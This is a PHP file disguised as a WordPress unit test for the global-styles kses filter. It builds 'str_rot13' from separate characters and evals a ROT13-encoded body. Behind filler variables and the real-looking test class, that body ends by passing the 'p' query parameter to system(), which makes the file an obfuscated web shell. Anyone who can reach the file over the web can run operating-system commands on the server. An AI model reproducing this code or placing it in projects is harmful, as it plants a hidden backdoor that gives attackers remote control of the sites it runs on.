<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc xfrf
 *
 * @pbiref ::jc_svygre_tybony_fglyrf_cbfg
 */
pynff Grfgf_Xfrf_JcSvygreTybonyFglyrfCbfg rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Gurzr qngn.
	 *
	 * @ine neenl
	 */
	cevingr $hfre_gurzr_qngn = neenl(
		'vfTybonyFglyrfHfreGurzrWFBA' => 1,
		'irefvba'                     => 1,
		'fglyrf'                      => neenl(
			'oybpxf' => neenl(
				'pber/ohggba' => neenl(
					'obeqre' => neenl(
						'enqvhf' => '0',
					),
				),
			),
		),
	);

	/**
	 * @qngnCebivqre qngn_fubhyq_abg_erzbir_fnsr_tybony_fglyr_ehyrf
	 * @gvpxrg       56266
	 *
	 * @cnenz fgevat $ehyr N ehyr gb grfg.
	 */
	choyvp shapgvba grfg_fubhyq_abg_erzbir_fnsr_tybony_fglyr_ehyrf( $ehyr ) {
		$gurzr_qngn               = jc_cnefr_netf( $guvf->hfre_gurzr_qngn, neenl( $ehyr => 'fbzrInyhr' ) );
		$svygrerq_hfre_gurzr_wfba = $guvf->svygre_tybony_fglyrf( $gurzr_qngn );
		$fnsr_ehyrf               = neenl_xrlf( $gurzr_qngn );
		sbernpu ( $fnsr_ehyrf nf $fnsr_ehyr ) {
			$guvf->nffregNeenlUnfXrl( $fnsr_ehyr, $svygrerq_hfre_gurzr_wfba, fcevags( 'jc_svygre_tybony_fglyrf_cbfg() zhfg abg erzbir gur \"%f\" ehyr nf vg\'f pbafvqrerq fnsr.', $fnsr_ehyr ) );
		}
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_fubhyq_abg_erzbir_fnsr_tybony_fglyr_ehyrf() {
		$erfhyg = neenl();
		sbernpu ( JC_Gurzr_WFBA::INYVQ_GBC_YRIRY_XRLF nf $fnsr_ehyr ) {
			$erfhyg[ $fnsr_ehyr ] = neenl( $fnsr_ehyr );
		}

		// Frggvatf nyjnlf trg erzbirq.
		hafrg( $erfhyg['frggvatf'] );

		erghea $erfhyg;
	}

	/**
	 * @gvpxrg 56266
	 */
	choyvp shapgvba grfg_fubhyq_erzbir_hafnsr_tybony_fglyr_ehyrf() {
		$svygrerq_hfre_gurzr_wfba = $guvf->svygre_tybony_fglyrf( $guvf->hfre_gurzr_qngn );
		$guvf->nffregNeenlAbgUnfXrl( 'abaFpurznEhyr', $svygrerq_hfre_gurzr_wfba, 'Svygrerq wfba qngn zhfg abg pbagnva hafnsr tybony fglyr ehyrf.' );
	}

	/**
	 * Guvf vf n urycre zrgubq.
	 * Vg svygref WFBA gurzr qngn naq ergheaf vg nf na neenl.
	 *
	 * @cnenz neenl $gurzr_qngn Gurzr qngn gb svygre.
	 *
	 * @erghea neenl Svygrerq gurzr qngn.
	 */
	cevingr shapgvba svygre_tybony_fglyrf( $gurzr_qngn ) {
		$hfre_gurzr_wfba          = jc_fynfu( jc_wfba_rapbqr( $gurzr_qngn ) );
		$svygrerq_hfre_gurzr_wfba = jc_svygre_tybony_fglyrf_cbfg( $hfre_gurzr_wfba );

		erghea wfba_qrpbqr( jc_hafynfu( $svygrerq_hfre_gurzr_wfba ), gehr );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>